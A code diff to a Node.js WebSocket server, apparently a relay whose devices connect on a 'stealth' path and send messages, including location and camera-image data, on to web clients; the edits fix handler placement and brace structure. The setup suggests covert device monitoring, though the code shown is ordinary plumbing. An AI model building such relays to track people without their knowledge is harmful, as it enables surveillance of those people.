@@ -77,15 +77,12 @@ function broadcastToWebClients(obj) {
   }
 }
 
-// Main connection handler
 wss.on("connection", (ws, req) => {
   const url = new URL(req.url, `http://${req.headers.host}`);
   const pathname = url.pathname;
 
-  // Получаем deviceId из query параметра ИЛИ из пути
   let deviceId = url.searchParams.get("deviceId");
   
-  // Если путь /ws/stealth/XXX - берём XXX как deviceId
   if (!deviceId && pathname.startsWith("/ws/stealth/")) {
     const parts = pathname.split("/");
     deviceId = parts[parts.length - 1];
@@ -102,7 +99,6 @@ wss.on("connection", (ws, req) => {
         const dataStr = rawData.toString();
         const msg = JSON.parse(dataStr);
         
-        // Пересылаем всё веб-клиентам
         const broadcast = {
           type: msg.type || "message",
           deviceId: deviceId,
@@ -123,38 +119,40 @@ wss.on("connection", (ws, req) => {
       console.log(`Device ${deviceId} disconnected`);
     });
 
+    ws.on("error", (err) => {
+      console.error(`Device WebSocket error (${deviceId}):`, err);
+    });
+
   } else {
     // === ВЕБ-КЛИЕНТ ===
     webClients.add(ws);
     console.log(`Web client connected. Total: ${webClients.size}`);
 
-    ws.on("close", () => {
-      webClients.delete(ws);
-      console.log(`Web client disconnected. Total: ${webClients.size}`);
-    });
-  }
-});
-
     ws.on("message", (msg) => {
-      // Optionally handle web-client messages (e.g., requesting actions)
-      // For now, just log small messages
       try {
-        // if needed, parse JSON
         // const parsed = JSON.parse(msg.toString());
       } catch (e) {
         // ignore non-json
       }
     });
 
+    ws.on("close", () => {
+      webClients.delete(ws);
+      console.log(`Web client disconnected. Total: ${webClients.size}`);
+    });
+
     ws.on("error", (err) => {
       console.error("Web client WebSocket error:", err);
     });
-});
+  }
+}); // <-- закрывает wss.on("connection")
 
 // WS server-level errors
 wss.on("error", (err) => {
   console.error("WebSocket server error:", err);
 });
+
+// ===== API endpoints (full) =====
 
 // ===== API endpoints (full) =====
 
@@ -464,6 +462,7 @@ server.listen(PORT, () => {
   console.log("- Legacy devices path: ws://host/ws/stealth/SYS123");
   console.log("Available endpoints: /api/login, /api/location, /api/camera/image, /api/devices/:token, etc.");
 });
+
 
 
 
